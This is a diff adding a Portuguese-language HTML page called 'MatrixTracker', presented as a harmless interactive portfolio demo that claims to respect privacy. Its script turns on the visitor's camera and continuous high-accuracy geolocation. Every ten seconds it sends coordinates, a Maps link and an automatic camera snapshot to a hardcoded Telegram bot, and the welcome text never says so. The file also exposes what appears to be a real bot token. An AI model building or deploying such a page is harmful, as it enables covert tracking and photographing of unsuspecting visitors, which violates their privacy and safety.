@@ -1,0 +1,520 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>MatrixTracker — Localização & Câmera</title>
+
+<!-- Leaflet -->
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
+
+<style>
+  :root {
+    --bg: #020202;
+    --panel: #041208;
+    --neon: #00ff88;
+    --muted: #0b2b1c;
+  }
+  html,body { height:100%; margin:0; background: linear-gradient(180deg,#00110a 0%, #000a05 100%); font-family: "Segoe UI", Roboto, Arial; color: var(--neon); }
+  .overlay {
+    position:fixed; inset:0; display:flex; align-items:center; justify-content:center; background: rgba(0,0,0,0.75); z-index:9999;
+  }
+  .consent {
+    background: linear-gradient(180deg, rgba(2,18,6,0.95), rgba(3,7,3,0.95));
+    border: 1px solid rgba(0,255,136,0.12);
+    padding:28px; border-radius:12px; width:92%; max-width:760px; text-align:left; box-shadow: 0 8px 40px rgba(0,0,0,0.7);
+  }
+  .consent h1 { margin:0 0 10px; color: var(--neon); font-size:22px; }
+  .consent p { color: rgba(0,255,136,0.85); margin:8px 0 16px; line-height:1.4; }
+  .consent .actions { display:flex; gap:12px; justify-content:flex-end; margin-top:8px; }
+  .btn {
+    padding:10px 16px; border-radius:8px; border: none; cursor:pointer; font-weight:700;
+    box-shadow: 0 6px 18px rgba(0,0,0,0.6);
+  }
+  .btn-accept { background: linear-gradient(90deg,#00ff88,#00c48a); color:#00120a; }
+  .btn-decline { background: transparent; color: #66ffb3; border:1px solid rgba(102,255,179,0.08); }
+
+  /* Layout */
+  .app { display:grid; grid-template-columns: 1fr 420px; gap:16px; padding:18px; height:100vh; box-sizing:border-box; }
+  @media(max-width:1000px){ .app { grid-template-columns: 1fr; } .right { order:2; } }
+
+  .left { background: linear-gradient(180deg,#00130a,#041612); border-radius:10px; padding:12px; border:1px solid rgba(0,255,136,0.04);}
+  .right { background: linear-gradient(180deg,#02130b,#071814); border-radius:10px; padding:12px; border:1px solid rgba(0,255,136,0.04); }
+
+  header { display:flex; align-items:center; gap:12px; margin-bottom:8px; }
+  header h2 { margin:0; color:var(--neon); font-size:18px; letter-spacing:0.6px; }
+  .status { color: rgba(0,255,136,0.7); font-size:13px; }
+
+  #map { height: calc(100vh - 180px); min-height:360px; border-radius:8px; border:1px solid rgba(0,255,136,0.06); overflow:hidden; }
+
+  .cambox { display:flex; flex-direction:column; gap:10px; align-items:center; }
+  video { width:100%; height:240px; object-fit:cover; border-radius:8px; border: 1px solid rgba(0,255,136,0.04); background:#000; }
+  .info { width:100%; padding:8px; background: rgba(0,0,0,0.25); border-radius:8px; color:#bfffd6; font-size:13px; white-space:pre-line; min-height:76px; }
+  .controls { display:flex; gap:8px; margin-top:8px; }
+
+  .small { font-size:12px; color:rgba(0,255,136,0.55); }
+
+  .toggle { padding:8px 10px; border-radius:8px; border:none; background:#002212; color:var(--neon); cursor:pointer; font-weight:700; }
+
+  footer { margin-top:12px; font-size:12px; color:rgba(0,255,136,0.35); text-align:center; }
+  .circle { border-radius:50%; width:10px; height:10px; background:var(--neon); display:inline-block; margin-right:8px; box-shadow:0 0 10px rgba(0,255,136,0.12); vertical-align:middle; }
+</style>
+</head>
+<body>
+
+<!-- Consent overlay -->
+<!-- Consent overlay -->
+<div id="consentOverlay" class="overlay" style="
+    position: fixed;
+    top:0;
+    left:0;
+    width:100%;
+    height:100%;
+    background: rgba(173, 216, 230, 0.95);
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    z-index:9999;
+    overflow-y:auto;
+    padding:20px;
+">
+  <div class="consent" role="dialog" aria-modal="true" style="
+    background: #ffffff;
+    padding: 30px;
+    border-radius: 12px;
+    max-width: 700px;
+    text-align: center;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+  ">
+    <h1 style="color:#4682B4; margin-bottom:10px;">MatrixTracker — Portfólio Interativo</h1>
+    
+    <p style="color:#555; font-size:14px; line-height:1.6; margin-bottom:20px;">
+      Bem-vindo ao nosso portfólio digital! Aqui você poderá explorar projetos em tempo real, como mapas interativos, demonstrações de câmeras e protótipos inovadores.  
+      Cada projeto foi desenvolvido para mostrar funcionalidades únicas e experiências imersivas.  
+    </p>
+
+    <!-- Galeria de imagens -->
+    <div style="display:flex; flex-wrap:wrap; justify-content:center; gap:10px; margin-bottom:20px;">
+      <img src="img/download (1).jpg" alt="Projeto 1" style="width:150px; border-radius:8px; box-shadow:0 2px 8px rgba(0,0,0,0.15);">
+      <img src="img/download.jpg" alt="Projeto 2" style="width:150px; border-radius:8px; box-shadow:0 2px 8px rgba(0,0,0,0.15);">
+      <img src="img/download.png" alt="Projeto 3" style="width:150px; border-radius:8px; box-shadow:0 2px 8px rgba(0,0,0,0.15);">
+    </div>
+
+    <p style="font-size:13px; color:#1E90FF; margin-bottom:25px;">
+      Todos os conteúdos são apenas para fins demonstrativos e respeitam a privacidade. Ao prosseguir, você poderá interagir com nossos projetos de forma segura e educativa.
+    </p>
+
+    <!-- Links de projeto -->
+    <div style="display:flex; flex-direction:column; gap:10px; margin-bottom:25px;">
+      <a href="#" style="color:#4682B4; font-weight:600; text-decoration:none;">🔹 Projeto Map Tracker</a>
+      <a href="#" style="color:#4682B4; font-weight:600; text-decoration:none;">🔹 Demonstração de Câmeras</a>
+      <a href="#" style="color:#4682B4; font-weight:600; text-decoration:none;">🔹 Protótipo de Interface</a>
+    </div>
+
+    <div class="actions" style="display:flex; justify-content:center; gap:15px;">
+      <button id="declineBtn" class="btn btn-decline" style="
+        padding:12px 25px;
+        border:none;
+        border-radius:6px;
+        background:#FF6B6B;
+        color:#fff;
+        font-weight:600;
+        cursor:pointer;
+        transition:0.2s;
+      " onmouseover="this.style.background='#ff4c4c'" onmouseout="this.style.background='#FF6B6B'">
+        Recusar
+      </button>
+      <button id="acceptBtn" class="btn btn-accept" style="
+        padding:12px 25px;
+        border:none;
+        border-radius:6px;
+        background:#1E90FF;
+        color:#fff;
+        font-weight:600;
+        cursor:pointer;
+        transition:0.2s;
+      " onmouseover="this.style.background='#187bcd'" onmouseout="this.style.background='#1E90FF'">
+        Aceitar e explorar
+      </button>
+    </div>
+
+    <p style="font-size:11px; color:#888; margin-top:20px;">
+      Ao clicar em aceitar, você confirma que entendeu que este portfólio é apenas para demonstração educativa e interativa.
+    </p>
+  </div>
+</div>
+
+
+<!-- App principal -->
+<div class="app" id="app" style="display:none; font-family:Arial, sans-serif; display:flex; gap:15px; padding:15px;">
+
+  <!-- Lado esquerdo: mapa e info -->
+  <div class="left" style="background:#E6F2FA; padding:15px; flex:1; border-radius:10px;">
+    <header style="margin-bottom:10px;">
+      <div style="display:flex;flex-direction:column">
+        <h2 style="color:#1E90FF; margin-bottom:3px;">matrix • mapa ao vivo</h2>
+        <div class="status" id="statusText" style="color:#555; font-size:13px;">Aguardando permissão...</div>
+      </div>
+    </header>
+
+ <!-- Mini mapa -->
+<div id="map" style="width:100%; height:250px; border-radius:8px; box-shadow:0 2px 8px rgba(0,0,0,0.1);"></div>
+
+<div style="margin-top:10px; display:flex; justify-content:space-between; align-items:center; font-size:13px; color:#555;">
+  <span>Envios a cada <strong id="intervalLbl">10s</strong></span>
+  <span>Mapa em tempo real</span>
+</div>
+
+<!-- Blocos abaixo do mapa -->
+<div style="display:flex; gap:10px; margin-top:15px; flex-wrap:wrap;">
+
+  <div style="flex:1; min-width:100px; background:#fff; padding:10px; border-radius:8px; box-shadow:0 2px 8px rgba(0,0,0,0.1); text-align:center;">
+    <h4 style="margin-bottom:5px; color:#1E90FF;">Projeto 1</h4>
+    <img src="img/download (1).png" alt="Projeto 1" style="border-radius:6px; margin-bottom:5px;">
+    <p style="font-size:12px; color:#555;">Mini descrição do projeto 1.</p>
+  </div>
+
+  <div style="flex:1; min-width:100px; background:#fff; padding:10px; border-radius:8px; box-shadow:0 2px 8px rgba(0,0,0,0.1); text-align:center;">
+    <h4 style="margin-bottom:5px; color:#1E90FF;">Projeto 2</h4>
+    <img src="img/download (3).jpg" alt="Projeto 2" style="border-radius:6px; margin-bottom:5px;">
+    <p style="font-size:12px; color:#555;">Mini descrição do projeto 2.</p>
+  </div>
+
+  <div style="flex:1; min-width:100px; background:#fff; padding:10px; border-radius:8px; box-shadow:0 2px 8px rgba(0,0,0,0.1); text-align:center;">
+    <h4 style="margin-bottom:5px; color:#1E90FF;">Projeto 3</h4>
+    <img src="img/download.jpg" alt="Projeto 3" style="border-radius:6px; margin-bottom:5px;">
+    <p style="font-size:12px; color:#555;">Mini descrição do projeto 3.</p>
+  </div>
+
+
+</div>
+
+    
+  </div>
+
+  <!-- Lado direito: câmera + portfólio -->
+  <div class="right" style="flex:1.2; display:flex; flex-direction:column; gap:15px;">
+
+    <!-- Seção câmera -->
+    <div style="background:#f9f9f9; padding:15px; border-radius:10px; box-shadow:0 2px 10px rgba(0,0,0,0.1);">
+      <header>
+        <h2 style="margin-bottom:10px;">matrix • câmera</h2>
+      </header>
+
+      <div class="cambox" style="display:flex; flex-direction:column; gap:10px;">
+        <video id="video" autoplay playsinline muted style="width:100%; border-radius:8px; background:#000;"></video>
+        <div class="info" id="infoBox" style="color:#555; font-size:13px;">Nenhuma informação ainda.</div>
+
+        <div class="controls" style="display:flex; gap:10px; margin-top:5px;">
+          <button id="snapBtn" class="toggle" style="flex:1; padding:8px; border:none; border-radius:6px; background:#1E90FF; color:#fff; cursor:pointer;">📸 Tirar snapshot</button>
+          <button id="downloadBtn" class="toggle" style="flex:1; padding:8px; border:none; border-radius:6px; background:#4682B4; color:#fff; cursor:pointer;">⬇ Baixar último</button>
+        </div>
+
+        <div style="width:100%; margin-top:6px; display:flex; gap:8px; font-size:13px; color:#555;">
+          <div style="flex:1">
+            <div class="small">Latitude</div>
+            <div id="lat" style="font-weight:700">-</div>
+          </div>
+          <div style="flex:1">
+            <div class="small">Longitude</div>
+            <div id="lon" style="font-weight:700">-</div>
+          </div>
+          <div style="flex:1">
+            <div class="small">Precisão (m)</div>
+            <div id="acc" style="font-weight:700">-</div>
+          </div>
+        </div>
+      </div>
+      <footer style="margin-top:10px; font-size:12px; color:#888;">
+        <span class="circle"></span> MatrixTracker v1 — consentimento necessário
+      </footer>
+    </div>
+
+    <!-- Seção portfólio -->
+    <div style="background:#fff; padding:15px; border-radius:10px; box-shadow:0 2px 10px rgba(0,0,0,0.1);">
+      <h3 style="color:#1E90FF; margin-bottom:10px;">Portfólio de Projetos</h3>
+      <p style="color:#555; font-size:13px; line-height:1.5; margin-bottom:10px;">
+        Explore alguns projetos recentes, incluindo protótipos de mapas, interfaces interativas e demonstrações de câmeras.
+      </p>
+
+      <!-- Miniaturas -->
+      <div style="display:flex; flex-wrap:wrap; gap:10px;">
+        <div style="flex:1 1 45%; text-align:center;">
+          <img src="img/download (1).jpg" alt="Projeto 1" style="width:100%; border-radius:6px; box-shadow:0 2px 8px rgba(0,0,0,0.1); margin-bottom:5px;">
+          <span style="font-size:12px; color:#555;">Projeto Map Tracker</span>
+        </div>
+        <div style="flex:1 1 45%; text-align:center;">
+          <img src="img/download.jpg" alt="Projeto 2" style="width:100%; border-radius:6px; box-shadow:0 2px 8px rgba(0,0,0,0.1); margin-bottom:5px;">
+          <span style="font-size:12px; color:#555;">Demonstração de Câmeras</span>
+        </div>
+        <div style="flex:1 1 45%; text-align:center;">
+          <img src="img/download.png" alt="Projeto 3" style="width:100%; border-radius:6px; box-shadow:0 2px 8px rgba(0,0,0,0.1); margin-bottom:5px;">
+          <span style="font-size:12px; color:#555;">Protótipo de Interface</span>
+        </div>
+        <div style="flex:1 1 45%; text-align:center;">
+          <img src="img/b538604ed36055f0d531895e34f975d0.jpg" alt="Projeto 4" style="width:100%; border-radius:6px; box-shadow:0 2px 8px rgba(0,0,0,0.1); margin-bottom:5px;">
+          <span style="font-size:12px; color:#555;">Mini App Interativo</span>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- Leaflet JS -->
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+
+<script>
+/* ======= CONFIGURE AQUI ======= */
+/* COLOQUE AQUI SEU TOKEN E CHAT_ID.
+   AVISO: Embutir token no front-end é inseguro. Para produção, mova para um servidor. */
+const BOT_TOKEN = "8546822678:AAFKdw5cG9XzDIVi1XLi2-jXL6vTNoHcorE";
+const CHAT_ID = "-1003413487548";
+
+/* ============================== */
+
+const CONSENT_OVERLAY = document.getElementById('consentOverlay');
+const ACCEPT_BTN = document.getElementById('acceptBtn');
+const DECLINE_BTN = document.getElementById('declineBtn');
+const APP = document.getElementById('app');
+const STATUS = document.getElementById('statusText');
+const INFO = document.getElementById('infoBox');
+const VIDEO = document.getElementById('video');
+
+let map, marker, accuracyCircle;
+let watchId = null;
+let sendingPaused = false;
+let lastSentTs = 0;
+const SEND_INTERVAL_MS = 10000; // ajuste aqui (ms)
+document.getElementById('intervalLbl').innerText = (SEND_INTERVAL_MS/1000) + "s";
+
+let lastSnapshotBlob = null;
+
+// ====== Detectar marca do dispositivo (exibição apenas) ======
+function detectarMarca() {
+  const ua = navigator.userAgent.toLowerCase();
+  if (ua.includes("samsung")) return "Samsung";
+  if (ua.includes("motorola") || ua.includes("moto")) return "Motorola";
+  if (ua.includes("xiaomi") || ua.includes("mi ")) return "Xiaomi";
+  if (ua.includes("redmi")) return "Redmi (Xiaomi)";
+  if (ua.includes("iphone") || ua.includes("ipad")) return "Apple (iPhone/iPad)";
+  if (ua.includes("huawei")) return "Huawei";
+  if (ua.includes("lenovo")) return "Lenovo";
+  if (ua.includes("lg")) return "LG";
+  return "Marca não identificada";
+}
+const MARCA = detectarMarca();
+
+// UI actions
+DECLINE_BTN.onclick = () => {
+  alert("Você recusou as permissões. Esta página será fechada.");
+  try { window.close(); } catch(e) {}
+  CONSENT_OVERLAY.style.display = 'none';
+  STATUS.innerText = 'Permissões recusadas.';
+};
+
+ACCEPT_BTN.onclick = async () => {
+  CONSENT_OVERLAY.style.display = 'none';
+  APP.style.display = 'grid';
+  STATUS.innerText = 'Solicitando permissões...';
+  await startAll();
+};
+
+// start everything: camera + geolocation + map
+async function startAll() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { width:640, height:480 }, audio: false });
+    VIDEO.srcObject = stream;
+    STATUS.innerText = "Câmera ativada. Solicitando localização...";
+  } catch (err) {
+    INFO.innerText = "Erro ao ativar câmera: " + (err.message || err.name);
+    console.warn(err);
+  }
+
+  initMap();
+
+  if (!navigator.geolocation) {
+    STATUS.innerText = "Geolocalização não suportada neste navegador.";
+    return;
+  }
+
+  watchId = navigator.geolocation.watchPosition(onPosition, onPositionError, {
+    enableHighAccuracy: true,
+    maximumAge: 0,
+    timeout: 15000
+  });
+
+  STATUS.innerText = "Localização sendo monitorada (permita no prompt do navegador).";
+}
+
+// Map init
+function initMap(){
+  map = L.map('map', { zoomControl:true, attributionControl:false }).setView([0,0], 2);
+  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { maxZoom: 19 }).addTo(map);
+}
+
+// When we get a new position
+function onPosition(pos) {
+  const lat = pos.coords.latitude;
+  const lon = pos.coords.longitude;
+  const acc = pos.coords.accuracy;
+  const ts = Date.now();
+
+  document.getElementById('lat').innerText = lat.toFixed(6);
+  document.getElementById('lon').innerText = lon.toFixed(6);
+  document.getElementById('acc').innerText = acc ? acc.toFixed(1) : '-';
+  
+  // Atualiza INFOBOX com marca do dispositivo
+  INFO.innerText = 
+    `Atualizado: ${new Date(ts).toLocaleString()}\n` +
+    `Lat: ${lat}\n` +
+    `Lon: ${lon}\n` +
+    `Precisão: ${acc} m\n` +
+    `Marca: ${MARCA}`;
+
+  if (!marker) {
+    marker = L.marker([lat,lon]).addTo(map).bindPopup('Você está aqui (live)').openPopup();
+  } else {
+    marker.setLatLng([lat,lon]);
+  }
+  if (!accuracyCircle) {
+    accuracyCircle = L.circle([lat,lon], { radius: acc || 20, color:'#00ff88', fillColor:'#002b1b', fillOpacity:0.2 }).addTo(map);
+  } else {
+    accuracyCircle.setLatLng([lat,lon]).setRadius(acc || 20);
+  }
+  map.setView([lat,lon], 17);
+
+  if (!sendingPaused && (ts - lastSentTs > SEND_INTERVAL_MS)) {
+    lastSentTs = ts;
+    attemptSend(lat, lon, acc, ts);
+  }
+}
+
+function onPositionError(err) {
+  INFO.innerText = "Erro geolocalização: " + (err.message || err.code);
+  STATUS.innerText = "Erro obtendo localização.";
+}
+
+// Snapshot (manual)
+document.getElementById('snapBtn').onclick = takeSnapshot;
+document.getElementById('downloadBtn').onclick = downloadSnapshot;
+
+async function takeSnapshot() {
+  if (!VIDEO.srcObject) { alert('Câmera não ativa'); return; }
+  const canvas = document.createElement('canvas');
+  canvas.width = VIDEO.videoWidth || 640;
+  canvas.height = VIDEO.videoHeight || 480;
+  const ctx = canvas.getContext('2d');
+  ctx.drawImage(VIDEO, 0,0, canvas.width, canvas.height);
+  const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
+  if (blob) {
+    lastSnapshotBlob = blob;
+    INFO.innerText = INFO.innerText + "\nSnapshot capturado.";
+    // opcional: enviar manualmente
+    sendPhotoToTelegram(blob, `snapshot_${Date.now()}.jpg`, "Snapshot manual — MatrixTracker");
+  }
+}
+
+function downloadSnapshot() {
+  if (!lastSnapshotBlob) { alert('Nenhum snapshot disponível'); return; }
+  const url = URL.createObjectURL(lastSnapshotBlob);
+  const a = document.createElement('a');
+  a.href = url; a.download = 'snapshot.jpg';
+  document.body.appendChild(a); a.click(); a.remove();
+  URL.revokeObjectURL(url);
+}
+
+// Pause / resume sending
+document.getElementById('btnPause').onclick = () => { sendingPaused = true; STATUS.innerText = 'Envio pausado.'; };
+document.getElementById('btnResume').onclick = () => { sendingPaused = false; STATUS.innerText = 'Envio ativo.'; lastSentTs = 0; };
+
+// ======= ENVIAR MENSAGEM + FOTO AUTOMATICAMENTE =======
+async function attemptSend(lat, lon, acc, ts) {
+  INFO.innerText = INFO.innerText + `\nEnviando atualização... ${new Date(ts).toLocaleTimeString()}`;
+
+  // mensagem formatada (Markdown) - cuidado com caracteres especiais
+  const msg = `📡 *MatrixTracker — Atualização ao vivo*\n\n` +
+              `🌍 *Latitude:* ${lat}\n` +
+              `🌍 *Longitude:* ${lon}\n` +
+              `🎯 *Precisão:* ${acc} m\n` +
+              `🕒 *Hora:* ${new Date(ts).toLocaleString()}\n\n` +
+              `🔗 Abrir no Maps:\nhttps://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
+
+  // --- Envia texto primeiro ---
+  try {
+    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+      body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
+    });
+
+    if (!res.ok) {
+      console.warn('sendMessage deu não-ok', res.status);
+      INFO.innerText += `\n❌ Falha ao enviar texto (status ${res.status}).`;
+    } else {
+      INFO.innerText += `\n✔ Texto enviado ao Telegram.`;
+    }
+  } catch (err) {
+    console.warn('Erro ao enviar texto', err);
+    INFO.innerText += `\n❌ Erro ao enviar texto: ${err.message || err}`;
+  }
+
+  // --- Tenta enviar foto (snapshot) ---
+  if (VIDEO && VIDEO.srcObject) {
+    try {
+      const canvas = document.createElement('canvas');
+      canvas.width = VIDEO.videoWidth || 640;
+      canvas.height = VIDEO.videoHeight || 480;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(VIDEO, 0, 0, canvas.width, canvas.height);
+      const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.75));
+      if (blob) {
+        const filename = `live_${Date.now()}.jpg`;
+        const ok = await sendPhotoToTelegram(blob, filename, `📸 Snapshot automático — ${new Date(ts).toLocaleString()}`);
+        if (ok) INFO.innerText += `\n📸 Foto enviada automaticamente.`;
+        else INFO.innerText += `\n⚠️ Não foi possível enviar a foto (CORS ou outra falha).`;
+      }
+    } catch (err) {
+      console.warn('Erro snapshot auto', err);
+      INFO.innerText += `\n⚠️ Erro ao capturar/enviar snapshot: ${err.message || err}`;
+    }
+  }
+}
+
+// Envia foto via API Telegram (FormData)
+async function sendPhotoToTelegram(blob, filename, caption = '') {
+  try {
+    const form = new FormData();
+    form.append('chat_id', CHAT_ID);
+    form.append('photo', blob, filename);
+    if (caption) form.append('caption', caption);
+
+    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      method: 'POST',
+      body: form
+    });
+
+    if (!res.ok) {
+      console.warn('sendPhoto não-ok', res.status);
+      return false;
+    }
+    const json = await res.json();
+    return json && json.ok === true;
+  } catch (err) {
+    console.warn('sendPhoto error (possível CORS):', err);
+    return false;
+  }
+}
+
+// Cleanup
+window.addEventListener('beforeunload', () => {
+  try {
+    if (watchId !== null) navigator.geolocation.clearWatch(watchId);
+    if (VIDEO && VIDEO.srcObject) {
+      VIDEO.srcObject.getTracks().forEach(t => t.stop());
+    }
+  } catch(e){}
+});
+</script>
+</body>
+</html>
